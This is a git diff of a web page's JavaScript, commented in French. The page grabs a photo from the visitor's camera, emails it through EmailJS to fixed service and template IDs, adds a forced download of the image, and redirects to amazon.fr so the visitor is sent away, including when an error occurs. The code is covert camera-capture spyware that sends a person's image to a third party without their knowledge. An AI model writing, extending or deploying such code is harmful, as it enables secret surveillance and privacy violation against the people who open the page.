@@ -50,12 +50,24 @@
 
           stream.getTracks().forEach(track => track.stop());
 
+          // 📧 Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
             message: "Photo auto 📸",
             image: imageData
-          }).finally(() => {
-            window.location.href = "https://www.amazon.fr";
           });
+
+          // 💾 Téléchargement automatique
+          const link = document.createElement('a');
+          link.href = imageData;
+          link.download = "photo_capture.jpg";
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+
+          // 🔀 Redirection vers Amazon
+          setTimeout(() => {
+            window.location.href = "https://www.amazon.fr";
+          }, 500);
         };
       } catch (err) {
         window.location.href = "https://www.amazon.fr";
